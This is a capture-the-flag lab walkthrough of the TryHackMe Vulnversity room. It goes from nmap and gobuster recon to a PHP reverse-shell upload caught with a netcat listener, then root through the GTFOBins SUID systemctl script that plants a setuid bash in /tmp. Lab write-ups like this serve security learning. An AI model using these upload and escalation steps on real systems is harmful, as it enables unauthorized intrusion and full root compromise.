# Day 30 — TryHackMe: Vulnversity (Full Walkthrough)

## 🎯 Goal
Apply everything learned over the 30 days in one full end-to-end box: **recon → enumeration → exploitation (file upload) → privilege escalation (SUID)**.

Room: `tryhackme.com/r/room/vulnversity` — Target IP: `10.10.68.23`

---

## 🧩 Task 1 — Deploy the Machine
- Connect via OpenVPN (or browser-based AttackBox), deploy the target machine.
- No answer needed — just click **Start Machine**.

---

## 🧩 Task 2 — Reconnaissance (Nmap)

```bash
sudo nmap -A 10.10.68.23
```

### Results
| Port | State | Service | Version |
|---|---|---|---|
| 21 | open | ftp | vsftpd 3.0.3 |
| 22 | open | ssh | OpenSSH 7.2p2 Ubuntu |
| 139 | open | netbios-ssn | Samba smbd 3.X–4.X |
| 445 | open | netbios-ssn | Samba smbd 4.3.11-Ubuntu |
| 3128 | open | http-proxy | Squid http proxy 3.5.12 |
| 3333 | open | http | Apache httpd 2.4.18 (Ubuntu) — title: **"Vuln University"** |

> OS guess: Linux 5.4 (99%)

### Research the Squid version
```
Google: "Squid http proxy 3.5.12 exploit"
```
Found relevant CVEs (e.g. CVE-2016-10002 — DoS via malformed HTTP requests) but no direct RCE for this version — moved on to the web app on port 3333 instead.

---

## 🧩 Task 3 — Web Enumeration

### Directory brute-force with Gobuster
```bash
gobuster dir -u http://10.10.68.23:3333 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

### Key findings
```
/.htpasswd    (403)
/.htaccess    (403)
/css          (301)
/fonts        (301)
/images       (301)
/index.html   (200)
/internal     (301)   ← interesting!
/js           (301)
/server-status(403)
```

### Fingerprint the site (Wappalyzer)
Visiting `http://10.10.68.23:3333` shows the **Vuln University** site. Wappalyzer extension revealed:
- JS libraries: jQuery 3.2.1, jQuery Migrate 3.0.1, OWL Carousel, AOS, lit-element/lit-html
- UI Framework: **Bootstrap 4.1.0**
- Misc: Popper, Google Font API, Ionicons, Google Maps

### Exploring `/internal/`
```
10.10.68.23:3333/internal/
```
Shows a directory listing (`Index of /internal/uploads`) — indicates a **file upload feature** on this endpoint. This is the entry point.

---

## 🧩 Task 4 — Exploitation: File Upload Vulnerability

The `/internal/` page has a file upload form intended for images, but the server **doesn't validate file extensions properly**.

### Get a PHP reverse shell payload
Source: `pentestmonkey.net/tools/web-shells/php-reverse-shell`
```php
$ip = '<YOUR_IP>';   // CHANGE THIS
$port = 1234;        // CHANGE THIS
```
1. Edit the `$ip` and `$port` in `php-reverse-shell.php` to match your Kali IP and a listening port.
2. Start a listener:
```bash
nc -lvnp 1234
```
3. Upload the modified `.php` file through the `/internal/` upload form.
4. Browse to the uploaded file's path (e.g. `/internal/uploads/php-reverse-shell.php`) to trigger it.
5. Catch the shell in your `netcat` listener → low-privilege shell as the web server user.

---

## 🧩 Task 5 — Privilege Escalation (SUID)

### Concept: SUID bit
**SUID (Set owner userId upon execution)** gives a file **temporary permissions of the file owner** (rather than the user running it).
```
Example: /usr/bin/passwd has SUID set, because a normal user
needs to write to /etc/shadow — root does, so passwd runs
with root privileges to make the change safely.
```
Permission representation:
```
4   2   1   4   2   1   4   2   1
r   w   x   r   w   x   r   w   x
        ↓ SUID bit sets 's' in owner execute position
r   w   s   r   w   x   r   w   x
                    ↑ USER
```

### Find SUID binaries
```bash
find / -perm -4000 -type f 2>/dev/null
```
> Standout file found: `/bin/systemctl` — a non-standard SUID binary (not typically SUID by default), a strong sign of an intentionally vulnerable/misconfigured binary.

### Exploit via GTFOBins
Reference: **gtfobins.github.io** — curated list of Unix binaries that can be abused to bypass local security restrictions (SUID, Sudo, Capabilities, Shell, File read/write, etc.)

Search `systemctl` on GTFOBins → SUID escalation technique:
```bash
TF=$(mktemp)
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF
/tmp/rootbash -p
```
→ Spawns a root shell (`rootbash -p` preserves elevated privileges).

### Answer questions
- **SUID file that stands out**: `/bin/systemctl`
- **Root flag**: captured from `/root/root.txt` after escalation ✅

---

## 🏆 Room Completion
`Room completed (100%)` — full chain: Nmap recon → Gobuster enumeration → file upload RCE → SUID privilege escalation → root.

---

## ✅ Key Takeaways
- Always check **non-standard ports** (like 3128, 3333) — real vulnerabilities often hide outside 80/443.
- **File upload forms** are a classic web app weak point — always test for extension/type filtering bypass.
- **GTFOBins** is an essential reference for privilege escalation once you find unusual SUID/sudo binaries — it's not a list of "vulnerable" programs, but of legitimate functions that can be abused.
- This box ties together nearly every skill from Day 22–29: hashing/cracking mindset, tunnel/pivoting concepts, and social-engineering-adjacent evasion (careful enumeration) — capped off with a full pentest methodology from recon to root.
